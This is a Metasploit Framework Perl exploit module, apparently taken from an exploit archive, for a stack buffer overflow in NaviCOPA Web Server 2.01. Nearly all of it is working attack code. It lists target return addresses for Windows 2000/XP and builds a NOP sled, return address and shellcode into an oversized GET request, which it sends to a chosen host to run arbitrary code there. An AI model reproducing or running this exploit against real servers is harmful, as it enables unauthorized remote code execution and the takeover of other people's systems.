NaviCOPA Web Server 2.01 (GET) Remote Buffer Overflow Exploit meta
==================================================================

##	
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::navicopa_get_overflow;
use base "Msf::Exploit";
use strict;
use Pex::Text;
my $advanced = { };

my $info =
  {
	&#039;Name&#039;  => &#039;Navicopa 2.01 Buffer Overflow&#039;,
	&#039;Version&#039;  => &#039;$Revision: 0.1 $&#039;,
	&#039;Authors&#039; => [ &#039;Jacopo Cervini <acaro [at] jervus.it>&#039;, ],
	&#039;Arch&#039;  => [ &#039;x86&#039; ],
	&#039;OS&#039;    => [ &#039;win32&#039; ],
	&#039;Priv&#039;  => 1,

	&#039;UserOpts&#039;  =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 80],
		&#039;SSL&#039;   => [0, &#039;BOOL&#039;, &#039;Use SSL&#039;],
	  },

	&#039;Payload&#039; =>
	  {
		&#039;Space&#039;     => 400,
		&#039;MinNops&#039;	=> 16,
		&#039;BadChars&#039;  => "\x00\x20\x0a\x0d\x2f\x25\x3f",
		&#039;Keys&#039;      => [&#039;+ws2ord&#039;],
	  },
	  

	&#039;Description&#039;  => Pex::Text::Freeform(qq{
This module exploits a classical stack overflow in Navicopa Web Server 2.01 version		
Credit to h07 for discovered this vulnerability.
This is a port to the original h07 c code.  
}),

	&#039;Refs&#039;  =>
	  [
			[&#039;BID&#039;,   20250],
			  ],

	&#039;Targets&#039; =>
	  [
		[&#039;Windows 2k/XP for all service pack English&#039;,228, 0x1002c46f ], #  push esp,ret in IV320009.dll
		[&#039;Windows 2k/XP for all service pack Italian&#039;,227, 0x1002c46f ], #  push esp,ret in IV320009.dll

	  ],

	&#039;Keys&#039; => [&#039;navicopa&#039;],
	&#039;DisclosureDate&#039; => &#039;Sep 28 2006&#039;,


  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
	my $shellcode   = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;

	my $target = $self->Targets->[$target_idx];


	my $pattern = $self->MakeNops($target->[1]);
	$pattern .= pack(&#039;V&#039;, $target->[2]);
	$pattern .= $self->MakeNops(32);
	$pattern .= $shellcode;

	my $request = "GET " . $pattern ." HTTP/1.1\r\n\r\n";

	$self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using push esp ret at 0x%.8x...", $target->[2]));

	my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );

	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}

	$s->Send($request);
	sleep(3);
	$s->Recv(-1, 10);
	$s->Close();
	return;
}



